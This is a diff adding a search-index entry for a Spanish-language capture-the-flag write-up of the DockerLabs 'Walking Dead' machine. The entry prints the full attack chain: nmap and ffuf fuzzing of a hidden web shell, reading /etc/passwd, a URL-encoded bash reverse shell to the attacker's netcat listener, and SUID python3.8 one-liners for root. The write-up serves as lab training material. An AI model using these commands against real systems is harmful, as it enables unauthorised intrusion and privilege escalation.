@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Walking Dead, DockerLabs",
+    "url": "/posts/walkingdead/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, fuzzing, nmap, ffuf, python, searchbins, urlencode, revshell",
+    "date": "2025-03-23 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de parametro      ffuf          ...",
+    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de parametro      ffuf              reverse shell      urlencodeada              escalada de privilegios      python              escalada de privilegios      searchbins      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX walkingdead 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 22 ssh, el 80 httpVamos a empezar revisando la web manualmente y vemos una pagina sin ninuguan dat pero si revisamos el codigo encontramos un link que nos lleva a un LFI o RCE pareciera , tendremos que buscar el parametroc para ello FUFFProbando a incluir archivos locales no encontraba nada pero pasnadole un whoami he tenido exito.ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/hidden/.shell.php\\?FUZZ\\=whoami -fs 0 ```            parametro      utilidad                  -c      damos color a la salida              -w      indicamos el diccionario              -u      la url              -fs      filtra las respuestas que tienen una longitud de 0 bytes      Obtenemos el parametro cmdAhora que tenemos el parametro vamos a probar a ver si podemos ejecutar comandos.Llagados a este punto ejecuto un cat /etc/passwd y vemos que hay dos usuarios rick y negan , esto nos abre dos puertas una o fuerza bruta contra ssh y una revshellAl tratarse de una maquina calificada como facil vamos a lo rapido primero asi que mandamos una revshell y hacemos las comprobaciones de suid , sudo y demas.Primero a la escuha con ncy luego nos lanzamos la revshell urlencodeada de otra forma no me funciono.en mi maquina local lanzo un netcat para recibir la conexion.nc -lnvp 1188y en la victimabash -c \"bash -i &gt;%26 %2Fdev%2Ftcp%2F172.17.0.1%2F1188 0&gt;%261\"Nos toca realizar el tratamiento de la tty para ello lanzamos los siguientes comandos script /dev/null -c bash    control Z con esto la pasamos a segundo plano  stty raw -echo ; fg  reset    en otra terminal lanzamos stty size para saber el numero de filas y columnas de nuestra terminal  export TERM=xterm  export SHELL=bash  stty rows 32 columns 149Con esos pasos nuestra term deberia ser funcional.Vemos que nos han dejado a python3.8 y que podemos escalar con el avriguemos como hacerlo porque de la forma habitual no me permitio cosa que en otras maquinas si, no acabo de entender  porque.Este primer comando me devuelve a www-data/usr/bin/python3.8 -c \"import os; os.system('/bin/bash')\" Lo mismo me sucede si abro la terminal de python y lanzo el comandoimport pty;pty.spawn(\"/bin/bash\");Ni caso a los dos comandos de arriba estaba trabajando como si estuviese activada la ejecucion con sudo y no con setuid, estoy espeso.Cualquiera de estos dos comando me  funciona para escalar a root ademas searchbins me lo deja claro./usr/bin/python3.8 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'Somos rootMuchas gracias a difundir y compartir lo que sabemos."
+  },
+  
+  {
     "title": "Bad Plugin - DockerLabs",
     "url": "/posts/badplugin/",
     "categories": "DockerLabs",
